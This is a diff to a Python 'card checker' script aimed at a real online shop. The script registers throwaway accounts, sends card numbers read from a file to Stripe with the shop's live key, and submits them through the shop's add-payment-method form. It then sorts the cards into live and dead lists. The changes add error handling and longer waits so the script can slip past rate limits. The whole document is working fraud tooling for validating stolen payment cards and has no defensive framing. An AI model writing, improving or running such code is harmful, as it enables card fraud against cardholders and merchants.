@@ -1,6 +1,6 @@
 """
-WayuuMarket Checker v5.0
-Direct form submission - bypasses nonce issue
+WayuuMarket Checker v5.1
+Real decline responses + error handling
 """
 import requests
 import random
@@ -13,7 +13,7 @@ import re
 INPUT_FILE = "cards.txt"
 LIVE_FILE = "live.txt"
 DEAD_FILE = "dead.txt"
-DELAY = 3
+DELAY = 5  # Increased delay to avoid rate limits
 
 def randmail():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
@@ -33,172 +33,133 @@ def check_card(cc, mes, ano, cvv):
         ano = str(ano)[-2:]
     mes = str(mes).zfill(2)
     
-    s = requests.Session()
-    s.headers.update({
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    })
-    
-    # Register
-    print("[*] Registering...")
-    r = s.get('https://wayuumarket.com/my-account/', timeout=30)
-    m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
-    if not m:
-        return 'ERROR', 'No register nonce'
-    
-    email = randmail()
-    s.post('https://wayuumarket.com/my-account/', data={
-        'email': email,
-        'woocommerce-register-nonce': m.group(1),
-        'register': 'Register',
-    }, timeout=30)
-    
-    # Get add-payment-method page
-    print("[*] Getting payment page...")
-    r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
-    html = r.text
-    
-    # Extract form nonce
-    form_nonce = None
-    m = re.search(r'name="woocommerce-add-payment-method-nonce"\s*value="([^"]+)"', html)
-    if m:
-        form_nonce = m.group(1)
-        print(f"[*] Form nonce: {form_nonce}")
-    
-    # Extract _wpnonce
-    wpnonce = None
-    m = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
-    if m:
-        wpnonce = m.group(1)
-    
-    # Create Payment Method via Stripe
-    print("[*] Creating payment method...")
-    guid = str(uuid.uuid4())
-    
-    pm_resp = requests.post(
-        'https://api.stripe.com/v1/payment_methods',
-        headers={
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-        },
-        data={
-            'type': 'card',
-            'billing_details[name]': 'John Smith',
-            'billing_details[email]': email,
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_month]': mes,
-            'card[exp_year]': ano,
-            'guid': guid,
-            'muid': guid,
-            'sid': guid,
-            'payment_user_agent': 'stripe.js/83a1f53796',
-            'referrer': 'https://wayuumarket.com',
-            'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
-        },
-        timeout=30
-    ).json()
-    
-    # Check PM errors
-    if 'error' in pm_resp:
-        err = pm_resp['error']
-        code = err.get('decline_code') or err.get('code', '')
-        msg = err.get('message', '')
+    try:
+        s = requests.Session()
+        s.headers.update({
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        })
         
-        ccn_codes = ['incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 
-                     'generic_decline', 'expired_card', 'lost_card', 'stolen_card',
-                     'do_not_honor', 'card_velocity_exceeded', 'fraudulent']
+        # Register
+        print("[*] Registering...")
+        r = s.get('https://wayuumarket.com/my-account/', timeout=60)
+        m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
+        if not m:
+            return 'ERROR', 'No register nonce'
         
-        if code in ccn_codes:
-            return 'CCN', f"{code}"
+        email = randmail()
+        s.post('https://wayuumarket.com/my-account/', data={
+            'email': email,
+            'woocommerce-register-nonce': m.group(1),
+            'register': 'Register',
+        }, timeout=60)
         
-        return 'DEAD', code or msg[:40]
-    
-    pm_id = pm_resp.get('id', '')
-    if not pm_id:
-        return 'ERROR', 'No PM ID'
-    
-    print(f"[*] PM: {pm_id[:25]}...")
-    
-    # Submit form directly
-    print("[*] Submitting payment form...")
-    
-    form_data = {
-        'payment_method': 'stripe',
-        'wc-stripe-payment-token': 'new',
-        'wc_stripe_selected_upe_payment_type': 'card',
-        'wc-stripe-new-payment-method': 'true',
-        'wc_stripe_payment_method': pm_id,
-        'stripe_source': pm_id,
-        'woocommerce-add-payment-method-nonce': form_nonce or '',
-        '_wpnonce': wpnonce or '',
-        '_wp_http_referer': '/my-account/add-payment-method/',
-    }
-    
-    r = s.post(
-        'https://wayuumarket.com/my-account/add-payment-method/',
-        data=form_data,
-        timeout=30,
-        allow_redirects=True
-    )
-    
-    response_text = r.text.lower()
-    
-    print(f"[*] Response length: {len(r.text)}")
-    
-    # Check response for success/failure
-    if 'payment method successfully added' in response_text or 'added successfully' in response_text:
-        return 'CHARGED', 'Card Added Successfully!'
-    
-    if 'has been added' in response_text:
-        return 'CHARGED', 'Payment Method Added!'
-    
-    # Check for decline messages
-    if 'declined' in response_text:
-        # Try to extract specific message
-        m = re.search(r'(your card was declined[^<]*)', response_text)
-        if m:
-            return 'CCN', 'Card Declined'
-        return 'CCN', 'Declined'
-    
-    if 'insufficient' in response_text:
-        return 'CCN', 'Insufficient Funds'
-    
-    if 'incorrect' in response_text and 'cvc' in response_text:
-        return 'CCN', 'Incorrect CVC'
-    
-    if 'expired' in response_text:
-        return 'CCN', 'Card Expired'
-    
-    if 'authentication' in response_text or '3d secure' in response_text:
-        return 'CCN', '3DS Required'
-    
-    if 'lost' in response_text or 'stolen' in response_text:
-        return 'CCN', 'Lost/Stolen Card'
-    
-    if 'error' in response_text or 'failed' in response_text:
-        # Try to find error message
-        m = re.search(r'class="woocommerce-error"[^>]*>([^<]+)', r.text)
-        if m:
-            err_msg = m.group(1).strip()[:50]
-            if any(x in err_msg.lower() for x in ['decline', 'insufficient', 'cvc', 'expired']):
-                return 'CCN', err_msg
-            return 'DEAD', err_msg
-    
-    # If we got redirected to payment-methods page, it might have worked
-    if 'payment-methods' in r.url and 'add-payment-method' not in r.url:
-        return 'CHARGED', 'Redirected to Payment Methods'
-    
-    # PM was created, card is likely valid
-    brand = pm_resp.get('card', {}).get('brand', '').upper()
-    return 'LIVE', f'PM Created ({brand})'
+        # Get payment page
+        print("[*] Getting payment page...")
+        r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=60)
+        html = r.text
+        
+        fnonce = re.search(r'add-payment-method-nonce.*?value="([^"]+)"', html)
+        wpnonce = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
+        
+        # Create PM
+        print("[*] Creating PM...")
+        guid = str(uuid.uuid4())
+        
+        pm_resp = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers={'content-type': 'application/x-www-form-urlencoded'},
+            data={
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_month]': mes,
+                'card[exp_year]': ano,
+                'guid': guid,
+                'muid': guid,
+                'sid': guid,
+                'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
+            },
+            timeout=60
+        ).json()
+        
+        if 'error' in pm_resp:
+            c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
+            msg = pm_resp['error'].get('message', '')
+            
+            if c in ['incorrect_cvc', 'insufficient_funds', 'generic_decline', 'expired_card', 
+                     'lost_card', 'stolen_card', 'do_not_honor', 'card_velocity_exceeded']:
+                return 'CCN', c
+            return 'DEAD', c or msg[:40]
+        
+        pm_id = pm_resp.get('id', '')
+        if not pm_id:
+            return 'ERROR', 'No PM'
+        
+        print(f"[*] PM: {pm_id[:20]}...")
+        
+        # Submit form
+        print("[*] Submitting form...")
+        r = s.post(
+            'https://wayuumarket.com/my-account/add-payment-method/',
+            data={
+                'payment_method': 'stripe',
+                'wc-stripe-payment-token': 'new',
+                'wc_stripe_payment_method': pm_id,
+                'stripe_source': pm_id,
+                'woocommerce-add-payment-method-nonce': fnonce.group(1) if fnonce else '',
+                '_wpnonce': wpnonce.group(1) if wpnonce else '',
+            },
+            timeout=60
+        )
+        
+        txt = r.text.lower()
+        
+        # Check responses
+        if 'added' in txt and ('success' in txt or 'payment method' in txt):
+            return 'CHARGED', 'Card Added!'
+        
+        if 'declined' in txt:
+            return 'CCN', 'Declined'
+        if 'insufficient' in txt:
+            return 'CCN', 'Insufficient Funds'
+        if 'incorrect' in txt and 'cvc' in txt:
+            return 'CCN', 'Incorrect CVC'
+        if 'security code' in txt:
+            return 'CCN', 'Security Code Error'
+        if 'expired' in txt:
+            return 'CCN', 'Expired Card'
+        if 'authentication' in txt or '3d secure' in txt:
+            return 'CCN', '3DS Required'
+        if 'lost' in txt or 'stolen' in txt:
+            return 'CCN', 'Lost/Stolen'
+        if 'do not honor' in txt:
+            return 'CCN', 'Do Not Honor'
+        if 'velocity' in txt:
+            return 'CCN', 'Card Velocity Exceeded'
+        
+        # Check for any error message
+        err_match = re.search(r'class="woocommerce-error"[^>]*>.*?<li>([^<]+)', r.text, re.DOTALL)
+        if err_match:
+            err = err_match.group(1).strip()
+            if any(x in err.lower() for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen']):
+                return 'CCN', err[:30]
+            return 'DEAD', err[:30]
+        
+        brand = pm_resp.get('card', {}).get('brand', '').upper()
+        return 'LIVE', f'PM OK ({brand})'
+        
+    except requests.exceptions.ConnectionError:
+        return 'ERROR', 'Connection Reset (rate limit)'
+    except requests.exceptions.Timeout:
+        return 'ERROR', 'Timeout'
+    except Exception as e:
+        return 'ERROR', str(e)[:30]
 
 def main():
     print("""
     ╔═══════════════════════════════════════╗
-    ║    WAYUUMARKET CHECKER v5.0           ║
-    ║    Direct Form Submission             ║
+    ║    WAYUUMARKET CHECKER v5.1           ║
+    ║    Real Decline Responses             ║
     ╚═══════════════════════════════════════╝
     """)
     
@@ -215,9 +176,11 @@ def main():
         print("No cards!")
         return
     
-    print(f"Cards: {len(cards)}\n" + "=" * 40)
+    print(f"Cards: {len(cards)}")
+    print(f"Delay: {DELAY}s (to avoid rate limits)")
+    print("=" * 40)
     
-    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0}
+    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
     
     for i, card in enumerate(cards, 1):
         p = card.split('|')
@@ -251,6 +214,13 @@ def main():
             print(f"[+] {get_bin(cc)}")
             stats['live'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
+        elif status == 'ERROR':
+            print(f"[ERROR] {msg}")
+            stats['error'] += 1
+            # Wait longer on error
+            if 'rate' in msg.lower() or 'connection' in msg.lower():
+                print("[*] Waiting 30s due to rate limit...")
+                time.sleep(30)
         else:
             print(f"[DEAD] {full}")
             print(f"[-] {msg}")
@@ -263,7 +233,11 @@ def main():
             time.sleep(DELAY)
     
     print("\n" + "=" * 40)
-    print(f"CHARGED: {stats['charged']} | CCN: {stats['ccn']} | LIVE: {stats['live']} | DEAD: {stats['dead']}")
+    print(f"CHARGED: {stats['charged']}")
+    print(f"CCN:     {stats['ccn']}")
+    print(f"LIVE:    {stats['live']}")
+    print(f"DEAD:    {stats['dead']}")
+    print(f"ERROR:   {stats['error']}")
 
 if __name__ == "__main__":
     main()
